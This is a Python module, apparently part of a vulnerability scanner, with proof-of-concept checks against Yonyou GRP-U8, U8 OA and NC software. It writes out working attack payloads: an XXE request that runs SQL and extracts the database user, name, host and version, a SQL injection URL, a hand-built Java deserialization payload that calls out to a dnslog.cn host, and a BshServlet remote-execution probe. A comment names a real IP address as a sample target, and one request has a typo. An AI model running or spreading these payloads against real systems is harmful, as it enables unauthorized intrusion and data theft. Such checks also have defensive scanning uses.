#!usr/bin/env python
#-*- coding:utf-8 _*-
"""
@author:ximi
@file: Oayongyou.py
@time: 2021/07/{DAY}
"""

import re
import sys
import threading
from module import globals
from core.verify import verify
from thirdparty import requests
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump
from module.api.dns import dns_result, dns_request

class oayongyou:

    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS

        self.threadLock =threading.Lock()

    def oa_proxy_CNNVD_201610_923_rce_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "用友GRP-u8存在XXE漏洞CNNVD-201610-923"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "用友 NC 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "用友GRP-U8行政事业内控管理软件"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "用友GRP-U8行政事业内控管理软件 "
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载外部SQL语句，以及命令执行"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"

        check_url = self.url + "/Proxy"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
        try:
            #print("\033[32m[o] 正在执行SQL语句:select 1,user,db_name(),host_name(),@@version...\033[0m")
            response = requests.post(url=check_url, headers=headers, data=data, timeout=10,verify=False)
            row_1 = '<ROW COLUMN1="1"'
            row_2 = r'COLUMN2="(.*?)"'
            row_3 = r'COLUMN3="(.*?)"'
            row_4 = r'COLUMN4="(.*?)"'
            row_5 = r'COLUMN5="(.*?)"'

            if row_1 in response.text and "服务器错误信息：null" not in response.text:
                db_user = re.findall(row_2, response.text)[0]
                db_name = re.findall(row_3, response.text)[0]
                db_host = re.findall(row_4, response.text)[0]
                db_vers = re.findall(row_5, response.text)[0]
                #print("\033[32m[o] 存在漏洞，漏洞响应为:\033[0m")
                #print("\033[32m >> 数据库用户为:{}\033[0m".format(db_user))
                #print("\033[32m >> 数据库名为:{}\033[0m".format(db_name))
                #print("\033[32m >> 数据库主机名为:{}\033[0m".format(db_host))
                #print("\033[32m >> 数据库版本为:{}\033[0m".format(db_vers))

                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[RCE] [" + data + "] "
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def oa_test_sql_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "用友 U8 OA test.jsp文件存在 SQL"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "用友 NC 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "用友 U8 OA"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "用友 U8 OA "
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        new_core = random_md5()
        url_p="/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))"
        try:
            response = requests.get(url=self.url+url_p, headers=self.headers, verify=False, timeout=10)
            if "c4ca4238a0b923820dcc509a6f75849b" in response.text and response.status_code == 200:
                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[sql] [" + url_p + "] "
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def oa_XbrlPersistenceServlet_rce_poc(self):
        '''
        dnslog上一直没有回显，试了很多站（受影响版本不是很好找
        '''
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "用友 NC XbrlPersistenceServlet反序列化_rce"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "用友 NC 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "用友 NC"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "用友 NC "
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "用友 NC XbrlPersistenceServlet反序列化漏洞"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        new_core = random_md5()
        # http://218.90.248.136:9000/  案例
        md = dns_request()
        url_p="/service/~xbrl/XbrlPersistenceServlet"
        cmd="pf44r6.dnslog.cn"
        thex = r"\x" + r'\x'.join([hex(ord(c)).replace('0x', '') for c in cmd])

        # dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显
        payloca_XbrlPersistenceServle = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02" \
                                             "\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77" \
                                             "\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07" \
                                             "\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74\x79\x74\x00\x12\x4c\x6a\x61" \
                                             "\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x03\x4c\x00\x04\x68\x6f\x73\x74\x71\x00" \
                                             "\x7e\x00\x03\x4c\x00\x08\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x71\x00\x7e\x00\x03\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x03\x78\x70\xff\xff\xff\xff" \
                                             "\x00\x00\x00\x50\x74\x00\x11" + thex + "\x3a\x38\x30\x74\x00\x00\x74\x00\x0e" + thex + "\x74\x00\x04\x68\x74\x74\x70\x70\x78\x74\x00\x18\x68" \
                                                                                                                        "\x74\x74\x70\x3a\x2f\x2f" +thex + "\x3a\x38\x30\x78"


        #print("hex:",payloca_XbrlPersistenceServle)

        try:
            req = requests.post(url=self.url+url_p, headers = self.headers, verify = False, data = payloca_XbrlPersistenceServle,timeou =25)
            if dns_result(md):
                self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [new core:" + new_core + "] "
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()



    def oa_BshServlet_rce_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "用友 NC bsh.servlet.BshServlet远程命令执行漏洞"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "用友 NC 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "用友 NC"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "用友 NC "
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        md = random_md5()
        Url_Payload1 = "/servlet/~ic/bsh.servlet.BshServlet"

        try:
            request = requests.get(url=self.url+Url_Payload1, headers=self.headers, timeout=self.timeout, verify=False)
            if request.status_code == 200:
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[RCE] [core name:" + Url_Payload1 + "] "
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()